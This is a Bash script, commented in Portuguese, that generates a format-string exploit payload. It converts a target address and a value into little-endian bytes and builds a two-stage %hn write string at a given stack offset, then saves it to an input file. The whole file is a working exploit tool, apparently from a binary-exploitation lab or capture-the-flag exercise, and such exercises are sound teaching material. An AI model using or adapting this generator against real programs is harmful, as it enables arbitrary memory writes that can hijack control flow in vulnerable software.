#!/bin/bash
help(){
 echo "Uso: ./fmtstr.sh flag_addr target_addr offset"
 echo "Exemplo: ./fmtstr.sh 0xbffff358 0x55667788 5"
}
if [ $1 == "-h" ];then
 help
else
 # Entradas
 addr_target=$1
 write_addr=$2
 offset=$3
 
 # Remove o prefixo "0x" da string
 hex="${addr_target#0x}"
 addr="${write_addr#0x}"
 
 # Calcula o hexadecimal + 2 bytes
 hex2b=$(printf "%04x" "$((0x$hex + 2))")
 
 # Inverte a ordem dos pares de caracteres
 hex_invertido="$(echo $hex | sed 's/../&\n/g' | tac | tr -d '\n')"
 hex_invertido_2b="$(echo $hex2b | sed 's/../&\n/g' | tac | tr -d '\n')"
 
 # Adiciona o prefixo "\x" a cada par de caracteres
 little_endian="$(echo $hex_invertido | sed 's/../\\x&/g')"
 little_endian_2b="$(echo $hex_invertido_2b | sed 's/../\\x&/g')"
 
 # Imprime as strings no formato \x44\x33\x22\x11
 #echo "$little_endian"
 #echo "$little_endian_2b"
 
 # Separa byte menos significativo
 addrP1="$(echo "$addr" | sed 's/\(....\)/\1 /g' | cut -d " " -f1)"
 addrP2="$(echo "$addr" | sed 's/\(....\)/\1 /g' | cut -d " " -f2)"
 addrP1="0x$addrP1"
 addrP2="0x$addrP2"
 #echo "$addrP1"
 #echo "$addrP2"
 
 # Monta format string
 fmt_str="$little_endian_2b$little_endian%.$(($addrP1-8))x%$(($offset+2))\$hn%.$(($addrP2-$addrP1))x%$(($offset+3))\$hn"
 echo -e $fmt_str > entrada_usuario
fi
